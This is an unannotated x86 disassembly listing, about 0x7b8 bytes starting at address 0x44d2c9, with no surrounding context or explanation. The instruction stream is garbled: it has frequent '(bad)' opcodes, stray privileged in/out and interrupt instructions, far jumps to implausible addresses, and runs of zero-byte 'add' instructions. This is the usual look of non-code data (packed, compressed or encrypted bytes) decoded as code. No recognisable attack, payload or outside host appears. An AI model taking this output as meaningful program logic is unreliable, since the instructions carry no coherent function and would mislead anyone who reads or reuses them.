  44d2c9:	jae    0x44d32a
  44d2cb:	jmp    0x44d304
  44d2cd:	xchg   ebp,eax
  44d2ce:	jl     0x44d2d5
  44d2d0:	cmp    BYTE PTR [edx+0x7c],ch
  44d2d3:	and    al,0x38
  44d2d5:	das    
  44d2d6:	jl     0x44d34e
  44d2d8:	cmp    dh,bh
  44d2da:	jnp    0x44d272
  44d2dc:	cmp    BYTE PTR [esi+0x6338c776],ah
  44d2e2:	jl     0x44d2e0
  44d2e4:	cmp    BYTE PTR [edx-0x3ac6dd85],al
  44d2ea:	jnp    0x44d2a5
  44d2ec:	cmp    DWORD PTR [ebx],ebx
  44d2ee:	jge    0x44d2f0
  44d2f0:	cmp    al,bh
  44d2f2:	jns    0x44d370
  44d2f4:	cmp    bl,BYTE PTR ds:0x243aa67a
  44d2fa:	jp     0x44d2f8
  44d2fc:	cmp    bh,BYTE PTR ds:0xd23b4c7b
  44d302:	jns    0x44d364
  44d304:	cmp    ebp,DWORD PTR [esi+0x79]
  44d307:	jg     0x44d344
  44d309:	out    dx,al
  44d30a:	jp     0x44d2f9
  44d30c:	cmp    edx,DWORD PTR [eax+0xad85c]
  44d312:	add    BYTE PTR [eax],al
  44d314:	add    BYTE PTR [eax],al
  44d316:	int3   
  44d317:	arpl   ax,bx
  44d319:	inc    ecx
  44d31a:	les    ebx,FWORD PTR [ebp-0x1c436442]
  44d320:	xlat   BYTE PTR ds:[ebx]
  44d321:	ret    0x26b4
  44d324:	fcomp  st(7)
  44d326:	lods   al,BYTE PTR ds:[esi]
  44d327:	dec    edi
  44d328:	fnstenv [eiz*4-0x62b026fe]
  44d32f:	mov    esi,0x9b959dd8
  44d334:	fadd   st,st(3)
  44d336:	(bad)  
  44d337:	jmp    0x44d311
  44d339:	hlt    
  44d33a:	test   DWORD PTR [edx],ebx
  44d33c:	ficomp DWORD PTR [edi+0x7e]
  44d33f:	(bad)  
  44d340:	fcmovb st,st(4)
  44d342:	ja     0x44d2e3
  44d344:	(bad)  
  44d346:	outs   dx,DWORD PTR ds:[esi]
  44d347:	pop    ecx
  44d348:	cld    
  44d349:	add    DWORD PTR [eax-0x6ffff40f],edx
  44d34f:	push   esi
  44d350:	mov    esp,0xbc6c600c
  44d355:	inc    edi
  44d356:	shl    BYTE PTR [edi],0xbc
  44d359:	aad    0xc0
  44d35b:	dec    ecx
  44d35c:	mov    ebp,0xbd23c143
  44d361:	jg     0x44d324
  44d363:	fdivr  DWORD PTR [ebp+ebx*4-0x2743795f]
  44d36a:	mov    eax,ds:0xa200c254
  44d36f:	mov    ecx,0xf8a22bc0
  44d374:	ror    BYTE PTR [ecx-0x163ec37e],0x0
  44d37b:	add    BYTE PTR [eax],al
  44d37d:	add    BYTE PTR [eax],al
  44d37f:	xor    BYTE PTR [eax-0x3f],0x13
  44d383:	xor    DWORD PTR [ecx+0x1183c1bf],0xffffffc0
  44d38a:	stc    
  44d38b:	arpl   WORD PTR [ebp-0x28],sp
  44d38e:	and    al,0x5c
  44d390:	mov    dl,0x3a
  44d392:	shr    BYTE PTR [ebx+0x25d0a47e],1
  44d398:	jle    0x44d392
  44d39a:	ror    BYTE PTR [ebp-0x362e8083],1
  44d3a0:	sub    BYTE PTR [esi+0x3a8a8bd2],0xcc
  44d3a7:	imul   ecx,DWORD PTR [edx-0x75c13393],0xffffff9a
  44d3ae:	int3   
  44d3af:	gs mov edi,ebx
  44d3b2:	int    0x54
  44d3b4:	mov    WORD PTR [edi-0x32],fs
  44d3b7:	sub    al,0x8c
  44d3b9:	daa    
  44d3ba:	into   
  44d3bb:	mov    edi,0x80cef18b
  44d3c0:	mov    edi,DWORD PTR [ebp-0x6174c132]
  44d3c6:	mov    DWORD PTR [ebp-0x7a],0x861dc870
  44d3cd:	pop    edx
  44d3ce:	enter  0x860b,0x3c
  44d3d2:	enter  0x85e1,0x6e
  44d3d6:	enter  0x85cd,0xc7
  44d3da:	enter  0x87f1,0x4b
  44d3de:	leave  
  44d3df:	pop    ebp
  44d3e0:	mov    ch,al
  44d3e2:	leave  
  44d3e3:	add    BYTE PTR [eax],al
  44d3e5:	add    BYTE PTR [eax],al
  44d3e7:	add    al,al
  44d3e9:	test   BYTE PTR [ecx+0x7f84c6c9],bh
  44d3ef:	leave  
  44d3f0:	repnz test BYTE PTR [eax-0x37],ch
  44d3f4:	hlt    
  44d3f5:	test   BYTE PTR [edx+ecx*8-0x21],ch
  44d3f9:	test   BYTE PTR [eax-0x37],dh
  44d3fc:	or     al,0x85
  44d3fe:	addr16 leave 
  44d400:	and    eax,DWORD PTR [ebp-0x7b0c366e]
  44d406:	leavew 
  44d408:	pop    eax
  44d409:	test   ecx,edx
  44d40b:	leave  
  44d40c:	sub    al,BYTE PTR [ebp+0x4259b90e]
  44d412:	sub    ebx,ebp
  44d414:	pop    edx
  44d415:	scas   al,BYTE PTR es:[edi]
  44d416:	daa    
  44d417:	hlt    
  44d418:	dec    edx
  44d419:	mov    edx,0x914b0327
  44d41e:	daa    
  44d41f:	rcr    dl,0x83
  44d422:	daa    
  44d423:	rcr    dl,1
  44d425:	jg     0x44d44e
  44d427:	pusha  
  44d428:	retf   0x2859
  44d42b:	jmp    0x955385c3
  44d430:	xchg   ebx,eax
  44d431:	mov    dl,0xe
  44d433:	jecxz  0x44d3f8
  44d435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d436:	push   ds
  44d437:	call   0x85bd:0x201da1c3
  44d43e:	sbb    eax,0x1d08e42a
  44d443:	and    ebx,ebp
  44d445:	dec    ebp
  44d446:	sbb    eax,0x1beae6f1
  44d44b:	int3   
  44d44c:	add    BYTE PTR [eax],al
  44d44e:	add    BYTE PTR [eax],al
  44d450:	add    dh,bl
  44d452:	aaa    
  44d453:	sbb    al,0xd5
  44d455:	fbld   TBYTE PTR [edi-0x64283ede]
  44d45b:	and    edi,eax
  44d45d:	shl    BYTE PTR [eax],0x22
  44d460:	jo     0x44d422
  44d462:	or     DWORD PTR [edx],esp
  44d464:	and    esp,DWORD PTR [eax+0x42]
  44d467:	and    dl,BYTE PTR [edx]
  44d469:	pusha  
  44d46a:	inc    esi
  44d46b:	and    dl,ah
  44d46d:	popa   
  44d46e:	mov    DWORD PTR [eax],esp
  44d470:	mov    bl,0x61
  44d472:	frstor [eax]
  44d474:	add    BYTE PTR [ecx+0x30],0x21
  44d478:	push   ebx
  44d479:	inc    ecx
  44d47a:	jp     0x44d49d
  44d47c:	add    al,0x41
  44d47e:	test   eax,0xc541381f
  44d483:	pop    ds
  44d484:	jge    0x44d4e2
  44d486:	push   edx
  44d487:	daa    
  44d488:	loope  0x44d4e4
  44d48a:	mov    eax,ds:0x79000025
  44d48f:	sar    DWORD PTR [ecx],1
  44d491:	arpl   WORD PTR [ecx-0x23],di
  44d494:	cmp    DWORD PTR ds:0x733a2677,edi
  44d49a:	je     0x44d500
  44d49c:	cmp    bh,BYTE PTR [ebp-0xfc5548c]
  44d4a2:	jae    0x44d4b3
  44d4a4:	cmp    esp,eax
  44d4a6:	jne    0x44d4fe
  44d4a8:	cmp    esi,DWORD PTR [ebx+0x77]
  44d4ab:	jle    0x44d4e8
  44d4ad:	mov    ecx,0x7c3ba377
  44d4b2:	ja     0x44d4b7
  44d4b4:	cmp    al,0x0
  44d4b6:	add    BYTE PTR [eax],al
  44d4b8:	add    BYTE PTR [eax],al
  44d4ba:	jp     0x44d536
  44d4bc:	cdq    
  44d4bd:	cmp    al,0x54
  44d4bf:	jp     0x44d46e
  44d4c1:	cmp    al,0xfd
  44d4c3:	jns    0x44d46b
  44d4c5:	cmp    al,0xa9
  44d4c7:	jp     0x44d473
  44d4c9:	cmp    al,0x75
  44d4cb:	jp     0x44d48b
  44d4cd:	cmp    al,0x4e
  44d4cf:	jp     0x44d4b8
  44d4d1:	cmp    al,0x56
  44d4d3:	jp     0x44d4d4
  44d4d5:	cmp    al,0xb9
  44d4d7:	imul   eax,DWORD PTR [edi+0x3d],0xffffffdd
  44d4db:	imul   ebx,DWORD PTR [edi+0x3d],0x31
  44d4df:	ins    DWORD PTR es:[edi],dx
  44d4e0:	xchg   edx,eax
  44d4e1:	cmp    eax,0x3d8b6d16
  44d4e6:	ds ins DWORD PTR es:[edi],dx
  44d4e8:	int3   
  44d4e9:	cmp    eax,0x3e276b92
  44d4ee:	xor    DWORD PTR [edx+0x42],edi
  44d4f1:	and    DWORD PTR ds:[edx-0x12],edi
  44d4f5:	mov    eax,ds:0x403ee978
  44d4fb:	jnp    0x44d54b
  44d4fd:	aas    
  44d4fe:	add    al,0x7b
  44d500:	inc    ebp
  44d501:	aas    
  44d502:	mov    ebx,0xb73f6079
  44d507:	jns    0x44d585
  44d509:	aas    
  44d50a:	nop
  44d50b:	aaa    
  44d50c:	xlat   BYTE PTR ds:[ebx]
  44d50d:	mov    dl,0x87
  44d50f:	add    edi,edx
  44d511:	(bad)  
  44d512:	aas    
  44d513:	pop    edx
  44d514:	fadd   QWORD PTR [edx]
  44d516:	nop
  44d517:	adc    eax,0x5890000c
  44d51c:	mov    esp,0xe
  44d521:	add    BYTE PTR [eax],al
  44d523:	pusha  
  44d524:	jbe    0x44d4e2
  44d526:	adc    DWORD PTR [ecx+0x69],esp
  44d529:	mov    ebp,0xbcbc6184
  44d52e:	mov    ds:0xeabd18c1,al
  44d533:	shr    DWORD PTR [eax],0xbd
  44d536:	pop    es
  44d537:	ret    0xc18b
  44d53a:	scas   al,BYTE PTR es:[edi]
  44d53b:	ret    
  44d53c:	or     eax,0x45a430c3
  44d541:	fsubr  st,st(7)
  44d543:	pushf  
  44d544:	adc    eax,0xc6a681be
  44d549:	mov    ebp,0xbd7b9ec2
  44d54e:	sub    al,0x87
  44d550:	int3   
  44d551:	mov    esi,0xdab07fec
  44d556:	es js  0x44d5a1
  44d559:	aam    0x2e
  44d55b:	js     0x44d50d
  44d55d:	fidiv  DWORD PTR [esi]
  44d55f:	push   0x683ed418
  44d564:	adc    ah,dl
  44d566:	inc    esi
  44d567:	pop    eax
  44d568:	or     ah,dl
  44d56a:	dec    esi
  44d56b:	pop    eax
  44d56c:	jo     0x44d542
  44d56e:	push   esi
  44d56f:	enter  0xd438,0x5e
  44d573:	enter  0xd3ac,0x32
  44d577:	mov    ecx,0xb9c7d4c4
  44d57c:	dec    ecx
  44d57d:	(bad)  
  44d57e:	std    
  44d57f:	test   eax,0xaa34da77
  44d584:	sub    edx,ebx
  44d586:	pop    edx
  44d587:	add    BYTE PTR [eax],al
  44d589:	add    BYTE PTR [eax],al
  44d58b:	add    BYTE PTR [edx+0x12ca71b2],bl
  44d591:	mov    BYTE PTR [edx-0x36],ah
  44d594:	std    
  44d595:	xchg   DWORD PTR [edx+ecx*8-0x353077ac],ebp
  44d59c:	xchg   edx,eax
  44d59d:	xchg   ecx,esi
  44d59f:	retf   0x8795
  44d5a2:	push   es
  44d5a3:	retf   
  44d5a4:	les    eax,FWORD PTR [edi-0x78f834d7]
  44d5aa:	arpl   bx,cx
  44d5ac:	out    0x86,eax
  44d5ae:	mov    dh,0xcb
  44d5b0:	dec    edi
  44d5b1:	xchg   ecx,edi
  44d5b3:	(bad)  
  44d5b4:	retf   
  44d5b5:	xchg   BYTE PTR [ebx],cl
  44d5b7:	enter  0x8616,0x4e
  44d5bb:	enter  0x85f1,0x7f
  44d5bf:	enter  0x85f7,0xf2
  44d5c3:	enter  0x8580,0xfd
  44d5c7:	enter  0x8504,0x24
  44d5cb:	leave  
  44d5cc:	ret    0x4684
  44d5cf:	leave  
  44d5d0:	fld    QWORD PTR [esi+ebx*8+0x584acc5]
  44d5d7:	(bad)  
  44d5d8:	popa   
  44d5d9:	test   BYTE PTR [eax+0x38841bc5],bh
  44d5df:	mov    dh,0x83
  44d5e2:	in     eax,dx
  44d5e3:	(bad)  
  44d5e4:	push   ecx
  44d5e5:	sub    DWORD PTR [ebp-0xa7cb83a],0xffffffe3
  44d5ec:	xchg   edx,eax
  44d5ed:	mov    dl,0xa5
  44d5ef:	add    eax,DWORD PTR [eax]
  44d5f1:	add    BYTE PTR [eax],al
  44d5f3:	add    BYTE PTR [eax],al
  44d5f5:	nop
  44d5f6:	mov    dl,0xb6
  44d5f8:	rcr    esp,cl
  44d5fa:	or     DWORD PTR [edx+0x318703d4],0xffffffce
  44d601:	pop    eax
  44d602:	mov    DWORD PTR [edi],edx
  44d604:	into   
  44d605:	in     al,dx
  44d606:	mov    DWORD PTR [edx],ebp
  44d608:	iret   
  44d609:	jb     0x44d595
  44d60b:	push   cs
  44d60c:	pop    es
  44d60d:	push   edi
  44d60e:	cmp    esp,DWORD PTR [eax]
  44d610:	loopne 0x44d65d
  44d612:	mov    ecx,0x7c440c26
  44d617:	test   BYTE PTR es:[ebx-0x4],bl
  44d61b:	es stc 
  44d61d:	pop    ecx
  44d61e:	add    eax,0x5a49a725
  44d623:	and    eax,0x2a814af1
  44d628:	das    
  44d629:	pop    eax
  44d62a:	aad    0x2a
  44d62c:	inc    ebx
  44d62d:	pop    eax
  44d62e:	adc    eax,0xd048a22b
  44d633:	sub    BYTE PTR [ebx+0x4d],bh
  44d636:	adc    ch,BYTE PTR [ecx]
  44d638:	push   edi
  44d639:	aad    0x6f
  44d63b:	sub    DWORD PTR [edx-0x1617be32],esp
  44d641:	jecxz  0x44d5f7
  44d643:	push   cs
  44d644:	xor    eax,0x560eb28c
  44d649:	ret    
  44d64a:	es pop ds
  44d64c:	xchg   ebp,eax
  44d64d:	shl    DWORD PTR [esi+0xbc2f21b],0x1c
  44d654:	xchg   esi,eax
  44d655:	(bad)  
  44d656:	jo     0x44d67b
  44d658:	push   ebp
  44d659:	add    BYTE PTR [eax],al
  44d65b:	add    BYTE PTR [eax],al
  44d65d:	add    al,ah
  44d65f:	fbld   TBYTE PTR [ebx]
  44d661:	(bad)  
  44d663:	sub    eax,0x61ca5924
  44d668:	sub    esi,ecx
  44d66a:	enter  0x2988,0xc5
  44d66e:	fdiv   DWORD PTR [edx+0x2a]
  44d671:	repnz int 0xea
  44d674:	sub    BYTE PTR [edi+0x7f28c0d5],bh
  44d67a:	int    0x12
  44d67c:	sub    DWORD PTR [edi],eax
  44d67e:	push   ebp
  44d67f:	mov    ch,0x27
  44d681:	ror    DWORD PTR [esi-0x78],0x27
  44d685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d686:	push   esi
  44d687:	in     eax,dx
  44d688:	daa    
  44d689:	add    BYTE PTR [ebx],cl
  44d68b:	js     0x44d683
  44d68d:	aas    
  44d68e:	imul   esi,DWORD PTR [edi-0x18],0xd7579ff
  44d695:	add    BYTE PTR [ecx],al
  44d697:	mov    ch,0xe
  44d699:	add    BYTE PTR [eax-0x7fcfb19a],dh
  44d69f:	push   dx
  44d6a1:	xor    BYTE PTR [ebx-0x2bcf909a],al
  44d6a7:	data16 jne 0x44d6da
  44d6aa:	jns    0x44d712
  44d6ac:	jns    0x44d6de
  44d6ae:	leave  
  44d6af:	data16 fdiv DWORD PTR [eax]
  44d6b2:	cld    
  44d6b3:	les    esi,FWORD PTR gs:[eax]
  44d6b6:	push   eax
  44d6b7:	fnsavew [eax]
  44d6ba:	in     eax,dx
  44d6bb:	gs or  eax,0xc63f631
  44d6c1:	xor    DWORD PTR [eax],eax
  44d6c3:	add    BYTE PTR [eax],al
  44d6c5:	add    BYTE PTR [eax],al
  44d6c7:	or     ah,BYTE PTR [ecx+esi*1+0x31]
  44d6cb:	mov    BYTE PTR [ebp+0x65],ah
  44d6ce:	xor    DWORD PTR [eax+0x64],esi
  44d6d1:	xchg   ecx,eax
  44d6d2:	xor    eax,0x3a576eef
  44d6d7:	push   ecx
  44d6d8:	ins    BYTE PTR es:[edi],dx
  44d6d9:	mov    dl,0x3a
  44d6db:	push   esp
  44d6dc:	imul   esp,DWORD PTR [ecx],0x3c
  44d6df:	dec    ebp
  44d6e0:	push   0x10
  44d6e2:	cmp    eax,0x3d9477e9
  44d6e7:	mov    DWORD PTR [eax-0x16],edi
  44d6ea:	ds clc 
  44d6ec:	jne    0x44d6d6
  44d6ee:	jmp    FWORD PTR [ecx-0x16fff2fc]
  44d6f4:	mov    ah,0xe
  44d6f6:	add    BYTE PTR [ecx],bh
  44d6f8:	data16 test BYTE PTR [eax],dh
  44d6fb:	and    ah,BYTE PTR [esi-0x34]
  44d6fe:	xor    BYTE PTR [ecx+0x66],bh
  44d701:	call   0x4eaa4036
  44d706:	xor    DWORD PTR [eax-0x3e6642dc],edx
  44d70c:	cmc    
  44d70d:	mov    ebx,0xbb7cc1a3
  44d712:	(bad)  
  44d713:	mov    eax,ds:0xa1ebbbaa
  44d718:	inc    edi
  44d719:	mov    ebp,0xbe0da21b
  44d71e:	cmp    eax,0x24be1ea2
  44d723:	xor    DWORD PTR [eax+ebx*8+0x77],0x7e
  44d728:	xor    ebx,edx
  44d72a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d72b:	add    BYTE PTR [eax],al
  44d72d:	add    BYTE PTR [eax],al
  44d72f:	add    BYTE PTR [esi+0x7f38d9a5],al
  44d735:	mov    cl,bl
  44d737:	cwde   
  44d738:	addr16 jnp 0x44d70e
  44d73b:	sub    BYTE PTR [ecx-0x2e],0xd4
  44d73f:	call   0xd59:0xa5d53859
  44d746:	(bad)  
  44d747:	or     eax,0x2cd582cb
  44d74c:	les    esp,FWORD PTR [ebp-0x30]
  44d74f:	jno    0x44d70d
  44d751:	test   al,0xd6
  44d753:	out    dx,al
  44d754:	mov    ch,0xfa
  44d756:	shl    DWORD PTR [ebx-0x52],1
  44d759:	cmp    dl,dl
  44d75b:	imul   esp,DWORD PTR [edi-0x60802cbe],0xfffffff0
  44d762:	sar    bh,cl
  44d764:	xlat   BYTE PTR ds:[ebx]
  44d765:	dec    ecx
  44d766:	lods   al,BYTE PTR ds:[esi]
  44d767:	add    dl,BYTE PTR [eax-0x6ffff437]
  44d76d:	inc    ebx
  44d76e:	mov    esi,0xbdcd8275
  44d773:	leave  
  44d774:	or     BYTE PTR [ebp-0x41],0x16
  44d778:	arpl   WORD PTR [edi+0x315c99be],ax
  44d77e:	fcom   st(3)
  44d780:	fs in  al,dx
  44d782:	xlat   BYTE PTR ds:[ebx]
  44d783:	int    0x5d
  44d785:	mov    dl,0x9b
  44d787:	int    0x7
  44d789:	mov    esi,eax
  44d78b:	int3   
  44d78c:	(bad)  
  44d78d:	xchg   DWORD PTR [eax+0x597b05cb],esp
  44d793:	retf   
  44d794:	add    BYTE PTR [eax],al
  44d796:	add    BYTE PTR [eax],al
  44d798:	add    cl,dh
  44d79a:	jns    0x44d728
  44d79c:	retf   0x7912
  44d79f:	ror    ecx,1
  44d7a1:	sbb    BYTE PTR [ebp+ecx*2-0x37],bh
  44d7a5:	cmp    DWORD PTR [esi-0x35],0x287e9ac7
  44d7ac:	inc    eax
  44d7ad:	iret   
  44d7ae:	jle    0x44d73d
  44d7b0:	inc    eax
  44d7b1:	out    dx,eax
  44d7b2:	jge    0x44d775
  44d7b4:	inc    eax
  44d7b5:	mov    BYTE PTR [ebp-0x36],bh
  44d7b8:	inc    eax
  44d7b9:	cdq    
  44d7ba:	jge    0x44d7d3
  44d7bc:	inc    ecx
  44d7bd:	aad    0x7d
  44d7bf:	sub    eax,0x997d1241
  44d7c4:	inc    ecx
  44d7c5:	out    dx,eax
  44d7c6:	jl     0x44d83f
  44d7c8:	inc    ecx
  44d7c9:	dec    esi
  44d7ca:	jge    0x44d776
  44d7cc:	inc    ecx
  44d7cd:	lahf   
  44d7ce:	or     cl,0x41
  44d7d1:	test   DWORD PTR [eax-0x7fdbbd99],eax
  44d7d7:	ds inc edx
  44d7d9:	fnstsw WORD PTR [edi-0x37]
  44d7dc:	inc    edx
  44d7dd:	je     0x44d85e
  44d7df:	jno    0x44d824
  44d7e1:	sbb    bh,BYTE PTR [edi+0x59]
  44d7e4:	inc    ebx
  44d7e5:	sar    DWORD PTR [esi-0x73],cl
  44d7e8:	inc    ebx
  44d7e9:	fistp  QWORD PTR [esi-0xb]
  44d7ec:	jae    0x44d781
  44d7ee:	mov    dl,0x39
  44d7f0:	add    al,0x90
  44d7f2:	mov    dl,0xe5
  44d7f4:	xor    ebx,DWORD PTR [esi]
  44d7f6:	sub    BYTE PTR [ecx+0x34],0xf9
  44d7fa:	xor    DWORD PTR [ebx],0x34
  44d800:	add    BYTE PTR [eax],al
  44d802:	fld    QWORD PTR [ecx-0x7e69cbd4]
  44d808:	push   cs
  44d809:	mul    DWORD PTR [edx+ebp*8+0x1d]
  44d80d:	mov    edi,0x671e205c
  44d812:	lds    ebp,FWORD PTR [edx+0x1e]
  44d815:	sbb    DWORD PTR [ebp-0x3a50e1c4],edi
  44d81b:	rcr    DWORD PTR [edx+eax*4],1
  44d81e:	mov    ebp,0xa66e1ccf
  44d823:	xor    al,0x1d
  44d825:	dec    ebx
  44d826:	sahf   
  44d827:	or     ebx,DWORD PTR ds:0x1d47a611
  44d82d:	(bad)  
  44d82e:	sahf   
  44d82f:	loope  0x44d84c
  44d831:	pop    eax
  44d832:	xchg   DWORD PTR [ecx],esi
  44d834:	sbb    al,0x6c
  44d836:	jle    0x44d859
  44d838:	sbb    al,0x72
  44d83a:	xchg   BYTE PTR [eax+0x7b780722],bl
  44d840:	and    dl,BYTE PTR [eax+0x68]
  44d843:	daa    
  44d844:	and    eax,DWORD PTR [ebp-0x50dcfba1]
  44d84a:	addr16 pop esi
  44d84c:	and    ebp,DWORD PTR [edi+ebx*2-0x37abde55]
  44d853:	clc    
  44d854:	and    DWORD PTR [esi-0x16dda538],ebp
  44d85a:	mov    ecx,0xb94720c0
  44d85f:	scas   al,BYTE PTR es:[edi]
  44d860:	pop    ds
  44d861:	sub    BYTE PTR [ebx+0xcb1fc3],ch
  44d867:	add    BYTE PTR [eax],al
  44d869:	add    BYTE PTR [eax],al
  44d86b:	stos   DWORD PTR es:[edi],eax
  44d86c:	shl    DWORD PTR [esi],0x37
  44d86f:	fwait
  44d870:	or     eax,0x38959025
  44d875:	and    eax,0x23dd8efc
  44d87a:	xor    BYTE PTR [edi+0x7f422b5b],al
  44d880:	aas    
  44d881:	sub    esp,edx
  44d883:	push   eax
  44d884:	sahf   
  44d885:	sub    DWORD PTR [eax],eax
  44d887:	test   al,0xf2
  44d889:	push   esp
  44d88a:	cmp    eax,0x3d6cf309
  44d88f:	fdiv   st,st(2)
  44d891:	addr16 cmp eax,0x3db0f234
  44d897:	div    edx
  44d899:	sar    DWORD PTR ds:0x3df1f28e,1
  44d89f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d8a0:	bnd jmp 0x353858e3
  44d8a6:	ds sub dh,bl
  44d8a9:	and    eax,0x3cf3353e
  44d8ae:	ds adc dh,bl
  44d8b1:	gs ds mov ah,0xf3
  44d8b5:	stos   DWORD PTR es:[edi],eax
  44d8b6:	ds sub eax,0x5a3eccf0
  44d8bc:	lock adc bh,BYTE PTR [edi]
  44d8bf:	mov    eax,ds:0x293f4af3
  44d8c4:	xor    DWORD PTR ds:0xeb66d00,ecx
  44d8ca:	add    BYTE PTR [ebx],bh
  44d8cc:	and    BYTE PTR [edx+0x31],0x0
  44d8d0:	add    BYTE PTR [eax],al
  44d8d2:	add    BYTE PTR [eax],al
  44d8d4:	mov    ds:0x2131fa81,al
  44d8d9:	xchg   DWORD PTR [edx+esi*1-0x39],ecx
  44d8dd:	test   BYTE PTR [edx+esi*1-0x74],al
  44d8e1:	test   BYTE PTR [ebp+0x32],ah
  44d8e4:	inc    esi
  44d8e5:	test   bh,bl
  44d8e7:	xor    bl,bl
  44d8e9:	test   DWORD PTR [edi],ebx
  44d8eb:	xor    ecx,DWORD PTR [ebp-0xfcc0479]
  44d8f1:	test   BYTE PTR [edx],dh
  44d8f3:	xor    al,0x1b
  44d8f5:	test   DWORD PTR [ebp+0x34],esi
  44d8f8:	(bad)  
  44d8f9:	test   BYTE PTR [esp+esi*1+0x35d27a41],cl
  44d900:	mov    eax,DWORD PTR [ebp-0x36fca13]
  44d906:	and    eax,0x24bc7ea9
  44d90b:	cs addr16 mov bh,0x25
  44d90f:	dec    ebx
  44d910:	pop    edi
  44d911:	adc    esp,DWORD PTR [edi]
  44d913:	xchg   esi,eax
  44d914:	addr16 in eax,dx
  44d916:	and    eax,0x244b5fed
  44d91b:	mov    ch,0xc9
  44d91d:	popa   
  44d91e:	sub    bl,BYTE PTR [ebx+0x67285eca]
  44d924:	mov    esp,0xb48d2825
  44d929:	mov    DWORD PTR [esi-0x3a],ecx
  44d92c:	lods   al,BYTE PTR ds:[esi]
  44d92d:	lods   al,BYTE PTR ds:[esi]
  44d92e:	dec    esi
  44d92f:	in     al,dx
  44d930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d931:	push   esi
  44d932:	sub    DWORD PTR [eax],ebx
  44d934:	popf   
  44d935:	std    
  44d936:	sub    BYTE PTR [eax+eax*1+0x0],dh
  44d93d:	xchg   ebp,eax
  44d93e:	xchg   esi,eax
  44d93f:	daa    
  44d940:	jmp    0x2c122d2
  44d945:	nop
  44d946:	test   eax,0xbe900012
  44d94b:	sbb    ebx,DWORD PTR [eax+eax*4+0x60b61c1a]
  44d952:	cmp    BYTE PTR [ecx],ah
  44d954:	push   esp
  44d955:	pop    ebp
  44d956:	loopne 0x44d977
  44d958:	ret    
  44d959:	pop    eax
  44d95a:	jne    0x44d980
  44d95c:	sti    
  44d95d:	pop    eax
  44d95e:	xor    ch,BYTE PTR [eax]
  44d960:	mov    bh,0xcc
  44d962:	dec    ecx
  44d963:	lods   al,BYTE PTR ds:[esi]
  44d964:	add    dl,BYTE PTR [eax-0x6ffff397]
  44d96a:	inc    esi
  44d96b:	sbb    al,0xcb
  44d96d:	mov    ebp,0xa64e2125
  44d972:	inc    esi
  44d973:	and    al,0x19
  44d975:	stos   BYTE PTR es:[edi],al
  44d976:	clc    
  44d977:	daa    
  44d978:	inc    ecx
  44d979:	pushf  
  44d97a:	adc    BYTE PTR [ecx],ch
  44d97c:	cwde   
  44d97d:	xchg   esi,eax
  44d97e:	inc    edi
  44d97f:	dec    edi
  44d980:	inc    edi
  44d981:	(bad)  
  44d982:	mov    dl,0xf5
  44d984:	mov    bl,0x92
  44d986:	mov    dl,0xd
  44d988:	add    al,0x90
  44d98a:	mov    dl,0x6e
  44d98c:	aaa    
  44d98d:	jecxz  0x44d915
  44d98f:	mov    bh,0x39
  44d991:	pop    ds
  44d992:	test   DWORD PTR [edi+0x3c],esi
  44d995:	jbe    0x44da14
  44d997:	jmp    0x92c3:0xf57c0340
  44d99e:	mov    dl,0x7d
  44d9a0:	add    eax,DWORD PTR [eax]
  44d9a2:	add    BYTE PTR [eax],al
  44d9a4:	add    BYTE PTR [eax],al
  44d9a6:	nop
  44d9a7:	mov    dl,0xc1
  44d9a9:	xor    al,al
  44d9ab:	add    ecx,0xc181b832
  44d9b1:	xor    dl,al
  44d9b3:	xor    DWORD PTR [ecx-0x5e7e27ce],0x8181c032
  44d9bd:	xor    bh,BYTE PTR [eax-0xfcd7e7f]
  44d9c3:	adc    DWORD PTR [ecx+0x4181b832],0x4181c035
  44d9cd:	xor    eax,0x354181b8
  44d9d2:	adc    BYTE PTR [ecx-0x7ee7ca8f],al
  44d9d8:	popa   
  44d9d9:	xor    eax,0x35418100
  44d9de:	clc    
  44d9df:	add    BYTE PTR [ecx+0x35],0xf0
  44d9e3:	adc    BYTE PTR [ecx+0x41813835],0x35
  44d9ea:	inc    eax
  44d9eb:	add    DWORD PTR [ecx+0x35],0x35e18593
  44d9f2:	xor    DWORD PTR [eax+ebx*2-0xa4d6fc9],eax
  44d9f9:	rcl    DWORD PTR [edx-0x6ffbe24e],cl
  44d9ff:	mov    dl,0xe
  44da01:	sbb    eax,0x3222c698
  44da06:	mov    WORD PTR [esi+0xfa25],?
  44da0c:	add    BYTE PTR [eax],al
  44da0e:	add    BYTE PTR [ecx+0x79bd2488],cl
  44da14:	xor    esp,DWORD PTR [eax+esi*2]
  44da17:	jnp    0x44da3d
  44da19:	and    al,0x38
  44da1b:	imul   ebp,DWORD PTR [ebx+ebp*1],0xffffff8f
  44da1f:	push   eax
  44da20:	mov    al,0x29
  44da22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44da23:	push   eax
  44da24:	loope  0x44da4f
  44da26:	pop    esi
  44da27:	push   ecx
  44da28:	adc    DWORD PTR [edx],ebp
  44da2a:	cmp    al,0xd1
  44da2c:	cmp    eax,0xbdc5992a
  44da31:	sub    BYTE PTR [ecx-0x42],dl
  44da34:	add    eax,0x51b60129
  44da39:	sub    DWORD PTR [edi],edx
  44da3b:	scas   al,BYTE PTR es:[edi]
  44da3c:	aas    
  44da3d:	sub    ebp,ebp
  44da3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44da40:	lods   eax,DWORD PTR ds:[esi]
  44da41:	daa    
  44da42:	fistp  DWORD PTR [esi+0x73e90eb2]
  44da48:	mov    ch,0xe
  44da4a:	int    0x93
  44da4c:	mov    dl,0xe
  44da4e:	imul   ecx,DWORD PTR [ecx+0x7f7a254a],0xffffff91
  44da55:	sub    DWORD PTR [ecx],ebp
  44da57:	sar    eax,1
  44da59:	sub    DWORD PTR [ebp+0x6b28c2d0],esi
  44da5f:	gs mov dl,0xe
  44da62:	jmp    0x41538f8a
  44da67:	mov    WORD PTR [edx+0x78c4ed0e],?
  44da6d:	sbb    eax,0x22a5bd3f
  44da72:	les    eax,FWORD PTR [eax]
  44da74:	add    BYTE PTR [eax],al
  44da76:	add    BYTE PTR [eax],al
  44da78:	(bad)  
  44da79:	mov    DWORD PTR [edx],esp
  44da7b:	and    BYTE PTR [eax-0x542bd97e],bh
  44da81:	dec    eax
